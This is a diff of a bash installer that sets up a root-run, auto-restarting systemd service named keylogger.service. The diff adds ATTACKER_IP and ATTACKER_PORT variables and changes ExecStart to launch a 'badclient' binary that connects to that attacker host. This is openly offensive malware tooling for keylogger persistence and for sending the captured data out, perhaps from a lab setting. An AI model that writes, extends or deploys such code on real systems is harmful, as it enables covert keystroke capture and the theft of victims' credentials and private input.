@@ -2,6 +2,9 @@
 
 PROJECT_DIR="/home/badguy/victim"
 
+ATTACKER_IP="192.168.99.10"
+ATTACKER_PORT=8080
+
 # One time install - create and enable service if missing
 if [ ! -f /etc/systemd/system/keylogger.service ]; then
     sudo bash -c "cat > /etc/systemd/system/keylogger.service <<EOF
@@ -13,8 +16,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=$PROJECT_DIR
-ExecStart=$PROJECT_DIR/klrun.sh
-ExecStop=$PROJECT_DIR/klstop.sh
+ExecStart=$PROJECT_DIR/badclient -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &
 Restart=always
 RestartSec=5
 
@@ -26,7 +28,7 @@ EOF"
     sudo systemctl enable keylogger.service
 fi
 
-# Start the service (systemd will run klrun.sh)
+# Start the service (systemd will run badclient)
 sudo systemctl start keylogger.service
 
 echo "[+] keylogger service started"
